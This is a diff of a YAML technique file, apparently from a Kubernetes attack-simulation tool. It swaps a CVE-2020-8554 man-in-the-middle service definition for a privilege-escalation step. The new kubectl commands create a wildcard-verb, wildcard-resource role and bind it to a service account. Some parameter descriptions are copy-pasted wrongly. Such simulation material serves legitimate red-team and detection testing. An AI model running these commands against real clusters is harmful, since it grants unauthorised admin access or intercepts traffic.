@@ -1,34 +1,37 @@
-name: MITM CVE-2020-8554
-description: CVE-2020-8554 Man in the middle using LoadBalancer or ExternalIPs
+name: Create Admin Role and bind it to a Service Account
+description: Create a highly privileged RBAC role and bind it to an existing service account
 tactic: Privilege Escalation
-techniques: ["Account Manipulation: Additional Container Cluster Roles"]
+techniques:
+  - "Account Manipulation: Additional Container Cluster Roles"
+  - T1098.006
 parameters:
-  INTERCEPT_IPS:
-    type: list
-    description: the IPs to intercept
-  SVC_NAME:
+  SERVICE_ACCOUNT:
     type: string
-    description: the name of the MitM service
-  SVC_TYPE:
+    default: default
+    description: the name of the service account to which the role will be bound
+  NAMESPACE:
     type: string
-    default: clusterip
-    description: the type of service to create
-  TARGET_LABEL:
+    default: ${NS}
+    description: the name of the namespace in which the role will be created
+  TOKEN:
     type: string
-    description: the label selector of the pod to which the traffic will be redirected
-  PORT:
-    type: int
-    default: 80
-    description: the port of service to create
-  # DST_BIN:
-  #   type: string
-  #   description: the destination path of the binary at the remote system
-  #   required: false
+    default: ""
+    description: the token used to authenticate to the API server
+  ROLE_NAME:
+    type: string
+    default: nsadmin
+    description: the name of the service account to which the role will be bound
+  BINDING_NAME:
+    type: string
+    default: ${SERVICE_ACCOUNT}-${ROLE_NAME}
+    description: the name of the service account to which the role will be bound
 cmdVariants:
   - key: kubectl
-    command: kubectl create service ${SVC_TYPE} ${SVC_NAME} --external-ip ${INTERCEPT_IPS} --tcp=${PORT} --dry-run=client -o yaml | kubectl apply -f -
+    command: >
+      kubectl create role ${ROLE_NAME} --verb=* --resource=* --token=${TOKEN}
+      && kubectl create rolebinding ${BINDING_NAME} --role=${ROLE_NAME} --serviceaccount=${NAMESPACE}:${SERVICE_ACCOUNT} --token=${TOKEN}
 preconditions:
-  accessLevel: "can-create service"
+  accessLevel: "can-create role && rolebinding"
 # cmd: {}
 # defend: {}
 refernces:
